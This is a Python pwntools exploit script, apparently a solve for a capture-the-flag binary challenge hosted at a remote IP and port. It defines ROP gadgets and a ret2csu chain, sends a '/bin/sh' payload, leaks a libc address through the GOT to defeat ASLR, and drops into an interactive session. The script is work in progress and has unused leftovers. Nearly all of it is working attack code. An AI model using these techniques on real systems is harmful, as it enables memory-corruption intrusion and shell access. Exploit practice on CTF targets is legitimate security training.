from pwn import *

CONN = "nc 34.101.122.7 10001".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# 0x7f682a46e2c0
# Specify GDB script here (breakpoints etc)
'''
b *main+233
b *main+282
b *main+287
b *main+323
b *main+328
c
'''
gdbscript = """
b *main+233
b *read+115
b *main+282
b *main+328
c
""".format(
    **locals()
)

# Binary filename
exe = "./chall"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

context.log_level = "debug"

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

if args.REMOTE:
    pass
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    # ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

NOPRET = 0x00000000004010cf # : nop ; ret
GADGET1 = 0x00000000004013dc #: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
GADGET2 = 0x00000000004013de #: pop r13 ; pop r14 ; pop r15 ; ret
GADGET3 = 0x00000000004013e0 #: pop r14 ; pop r15 ; ret
GADGET4 = 0x00000000004013e2 #: pop r15 ; ret
GADGET5 = 0x00000000004013db #: pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
GADGET6 = 0x00000000004013df #: pop rbp ; pop r14 ; pop r15 ; ret
GADGET7 = 0x000000000040113d #: pop rbp ; ret
GADGET8 = 0x00000000004013e3 #: pop rdi ; ret
GADGET9 = 0x00000000004013e1 #: pop rsi ; pop r15 ; ret
GADGET10 = 0x00000000004013dd #: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret


CSU = 0x401380
POPPER = 0x4013da
CALLER = 0x4013c0
INIT = 0x401000


print(elf.plt)
print(elf.sym)
print(elf.got)

# Start program
io = start()
# Build the payload

offset = 0
payload = flat({offset: [
  b"/bin/sh\x00",
  b"\xFB"*15,
  # b"\x00"
]})

sla(b":", payload)

ret2csu = flat(
  POPPER,
  0, #rbx
  1, #rbp
  1, #r12 <- RDI
  1, #r13 <- RSI
  0x404018, #r14 <- RDX
  elf.got["syscall"],
  # elf.got["syscall"], #r15 <- caller
  CALLER,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  elf.sym["read"]
)

sla(b":", ret2csu)
rl()

leak = u64(io.recvn(8))
print(hex(leak))
libc.address = leak - libc.sym["syscall"]
info("libc base address: " + hex(libc.address))


DISTANCE = 0xb8

io.interactive()